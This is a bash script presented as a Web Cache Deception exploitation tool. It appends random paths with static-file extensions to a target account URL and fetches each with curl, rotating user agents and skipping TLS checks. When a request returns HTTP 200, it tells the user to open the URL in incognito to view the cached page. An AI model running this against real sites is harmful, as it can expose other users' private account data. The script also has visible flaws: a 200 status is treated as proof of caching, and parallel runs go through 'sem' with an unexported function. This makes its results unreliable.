#!/bin/bash

##### Advanced Web Cache Deception exploitation script ####
## coder: akrech				#
## github: https://github.com/akr3ch
## website: akr3ch.xyz
## twitter: akr3ch
###########################################################

### Color codes ###
bold='\e[1m'
red='\e[31m'
green='\e[32m'
yellow='\e[33m'
blue='\e[34m'
none='\e[0m'

### Default Variables ###
LOG_FILE="wcd_log_$(date +%F_%T).log"
USER_AGENTS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" "Mozilla/5.0 (Linux; Android 10)")
DEFAULT_EXTENSIONS=(.js .css .pdf .jpg .png .svg .xml .gif)
DEFAULT_DYNAMIC_PATH=$(openssl rand -hex 8)  # Generate a random 8-character hex string
threads=5  # Default number of parallel threads

### Help Menu ###
if [[ ${1} == '-h' || ${1} == '--help' ]]; then
    echo -e "\n${bold}${blue}Usage: ${0} --url ${yellow}https://example.com/myaccount${none}\n"
    echo -e "${green}This script tests for potential Web Cache Deception (WCD) vulnerabilities."
    echo -e "${green}You can provide a URL and the script will test various file extensions to identify potential cache exposure."
    echo -e "\nOptions:"
    echo -e "  -u, --url \t\t The target URL to test."
    echo -e "  -e, --extensions \t Custom extensions to test (comma-separated)."
    echo -e "  -p, --path \t\t Custom path to append to the URL (default is a random string)."
    echo -e "  -t, --threads \t Number of parallel threads to use for testing (default: 5)."
    echo -e "  -l, --log \t\t Log output to a specified file (default: ${LOG_FILE})."
    exit 0
fi

### URL and Option Parsing ###
while [[ "$1" != "" ]]; do
    case $1 in
        -u | --url )        shift
                            url=$1
                            ;;
        -e | --extensions ) shift
                            IFS=',' read -r -a custom_extensions <<< "$1"
                            ;;
        -p | --path )       shift
                            dynamic_path=$1
                            ;;
        -t | --threads )    shift
                            threads=$1
                            ;;
        -l | --log )        shift
                            LOG_FILE=$1
                            ;;
        * )                 echo -e "${red}Invalid option: $1${none}" && exit 1
    esac
    shift
done

### Check URL input ###
if [[ -z ${url} ]]; then
    echo -e "${red}[Error] Please provide a valid URL using --url option.${none}" && exit 1
fi

### Set Extensions and Dynamic Path ###
extensions=("${custom_extensions[@]:-${DEFAULT_EXTENSIONS[@]}}")
dynamic_path=${dynamic_path:-$DEFAULT_DYNAMIC_PATH}  # Use provided path or default random path

### Print tested paths and extensions ###
echo -e "\n${blue}Testing the following URL paths for Web Cache Deception with dynamic path: ${dynamic_path}\n"
for ext in "${extensions[@]}"; do
    echo -e "${green}[${blue}*${green}] ${url}/${dynamic_path}${ext}"
done
echo -e "\n${yellow}Starting exploitation attempt with ${threads} parallel threads...\n"

### Function to send requests ###
function send_request() {
    ext=$1
    ua=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    status=$(curl -k -A "$ua" --max-time 5 --write-out "%{http_code}" --silent --output /dev/null "${url}/${dynamic_path}${ext}")
    if [[ $status == "200" ]]; then
        echo -e "\r${yellow}[`date '+%T'`]${none}${red} Cache data detected! Extension: [${ext}]" | tee -a "$LOG_FILE"
        echo -e "${yellow}[`date '+%T'`]${none}${red} Open the URL in Incognito mode: ${url}/${dynamic_path}${ext}" | tee -a "$LOG_FILE"
    else
        echo -ne "\r${green}[`date '+%T'`] ${none}${blue}Waiting for a valid response with ${ext}..."
    fi
}

### Function to run tasks in parallel ###
function run_parallel() {
    sem -j "$threads" send_request "$1"
}

### Main function with logging and concurrency ###
function main() {
    for ext in "${extensions[@]}"; do
        run_parallel "$ext"
    done
    wait
}

### Start Testing ###
main